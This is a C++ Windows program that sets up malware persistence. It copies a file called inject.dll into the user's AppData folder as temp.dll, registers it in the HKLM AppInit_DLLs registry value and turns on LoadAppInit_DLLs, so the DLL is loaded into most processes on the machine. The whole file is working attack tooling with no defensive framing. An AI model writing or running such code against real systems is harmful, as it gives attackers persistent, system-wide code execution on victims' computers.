#include "pch.h"
#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <shlwapi.h>
#include <comdef.h>
#include <sstream>
#include <vector>
using namespace std;

void error(DWORD retval) {
	_com_error error(retval);
	wcout << error.ErrorMessage() << endl;
}

int main() {
	//HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows
	HKEY hkey;
	HKEY hkey_appinit;
	HKEY hkey_loadinit;
	LPCSTR s = "Environment";

	long retval = RegOpenKeyExA(HKEY_CURRENT_USER, s, 0, KEY_ALL_ACCESS, &hkey);
	if (retval != 0) {
		cout << "Failed to open key!" << endl;
		error(retval);
		return -1;
	}
	else {
		cout << "Opened key!" << endl;
		
		

		CHAR buf[MAX_PATH] = { 0 };

		string full_path = getenv("HOMEPATH");

		LPCSTR appinit_reg = "Software\\Microsoft\\Windows NT\\CurrentVersion";
		retval = RegOpenKeyExA(HKEY_LOCAL_MACHINE, appinit_reg, 0, KEY_ALL_ACCESS, &hkey_appinit);
		if (retval != 0) {
			error(retval);
			return -1;
		}

		CHAR cwd[MAX_PATH];
		GetCurrentDirectoryA(MAX_PATH, cwd);
		string s_cwd(cwd);
		string new_file(cwd);
		string reg_file = "C:\\";
		s_cwd.append("\\inject.dll");
		new_file.append("\\temp.dll");
		full_path.append("\\AppData\\Local\\temp.dll");
		reg_file.append(full_path);
		

		//cout << s_cwd << endl;
		//cout << new_file << endl;
		//cout << full_path << endl;
		
		retval = CopyFileA(s_cwd.c_str(), new_file.c_str(), FALSE);
		retval = MoveFileExA(new_file.c_str(), full_path.c_str(), MOVEFILE_COPY_ALLOWED);
		
		retval = RegSetKeyValueA(hkey_appinit, "Windows", "AppInit_DLLs", REG_SZ, reg_file.c_str(), reg_file.length());
		error(retval);

		//HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs

		retval = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_ALL_ACCESS, &hkey_loadinit);
		if (retval != 0) {
			error(retval);
			return -1;
		}
		DWORD value = 1;
		retval = RegSetKeyValueA(hkey_appinit, "Windows", "LoadAppInit_DLLs", REG_DWORD, &value, sizeof(value));
		if (retval != 0) {
			error(retval);
			return -1;
		}

		RegCloseKey(hkey);
		RegCloseKey(hkey_appinit);
		RegCloseKey(hkey_loadinit);


	}
	
}